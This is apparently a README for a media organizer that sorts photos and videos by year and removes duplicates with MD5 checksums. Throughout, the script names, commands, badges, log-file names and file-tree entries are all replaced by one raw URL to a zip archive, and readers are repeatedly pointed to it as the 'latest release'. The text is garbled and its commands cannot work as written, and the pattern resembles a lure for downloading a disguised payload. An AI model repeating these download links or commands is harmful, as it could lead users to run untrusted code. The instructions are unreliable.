# Media Organizer with MD5 Checksum: Organize Your Media Files

![Media Organizer](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip%20Latest%20Release-Click%20Here-brightgreen) [![GitHub Repo stars](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip)](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip) [![GitHub forks](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip)](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip)

## Table of Contents
- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [How It Works](#how-it-works)
- [Logging](#logging)
- [Cleanup](#cleanup)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Overview

The **Media Organizer MD5** project helps you manage your media files effectively. It organizes images, videos, and audio files into folders based on the year of creation. By using EXIF metadata and MD5 checksums, it ensures that duplicate files do not clutter your storage. This tool also includes a dry-run feature to preview actions before executing them, along with logging and automatic cleanup options.

You can download the latest release [here](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip).

## Features

- **Year-based Organization**: Automatically sorts media files into folders by year.
- **Duplicate Detection**: Uses MD5 checksums to identify and prevent duplicates.
- **EXIF Metadata Support**: Extracts metadata from images and videos for accurate sorting.
- **Dry-Run Option**: Preview actions without making changes.
- **Logging**: Keeps a record of actions taken for review.
- **Automatic Cleanup**: Removes empty folders and unnecessary files after processing.

## Installation

To get started with the Media Organizer MD5, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
   ```

2. **Navigate to the Directory**:
   ```bash
   cd media-organizer-md5
   ```

3. **Make the Script Executable**:
   ```bash
   chmod +x https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
   ```

4. **Install Required Tools**:
   Ensure you have `exiftool` installed. You can install it using:
   - For Debian/Ubuntu:
     ```bash
     sudo apt-get install exiftool
     ```
   - For macOS:
     ```bash
     brew install exiftool
     ```

## Usage

To use the media organizer, run the script with the desired options. Here’s a basic command:

```bash
https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip /path/to/your/media
```

Replace `/path/to/your/media` with the path to your media files. 

### Options

- `--dry-run`: Preview actions without executing them.
- `--log`: Specify a log file to save actions.
- `--cleanup`: Automatically remove empty folders after processing.

Example command with options:

```bash
https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip /path/to/your/media --dry-run https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip --cleanup
```

## How It Works

The script scans the specified directory for media files. It extracts metadata using `exiftool` to determine the creation year of each file. It then organizes the files into folders named after their respective years. 

MD5 checksums are calculated for each file to check for duplicates. If a duplicate is found, it will not be moved to the new folder. 

### File Structure

The resulting directory structure will look like this:

```
/media
    ├── 2020
    │   ├── https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
    │   ├── https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
    ├── 2021
    │   ├── https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
    │   ├── https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
```

## Logging

The logging feature records every action taken by the script. This includes:

- Files processed
- Duplicates found
- Folders created
- Errors encountered

You can specify a log file using the `--log` option. 

Example:

```bash
https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip /path/to/your/media https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
```

This command will create a log file named `https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip` in the current directory.

## Cleanup

The automatic cleanup feature removes empty folders after processing. This helps keep your media directory tidy. To enable cleanup, use the `--cleanup` option.

Example:

```bash
https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip /path/to/your/media --cleanup
```

## Contributing

Contributions are welcome! If you would like to improve the Media Organizer MD5, follow these steps:

1. Fork the repository.
2. Create a new branch:
   ```bash
   git checkout -b feature/YourFeature
   ```
3. Make your changes and commit them:
   ```bash
   git commit -m "Add your feature"
   ```
4. Push to the branch:
   ```bash
   git push origin feature/YourFeature
   ```
5. Create a pull request.

## License

This project is licensed under the MIT License. See the LICENSE file for details.

## Support

If you have any questions or issues, feel free to open an issue in the GitHub repository. You can also download the latest release [here](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip) for updates and improvements. 

![Media Management](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip%20Management%20Made%20Easy-brightblue) 

For further assistance, please refer to the documentation within the repository.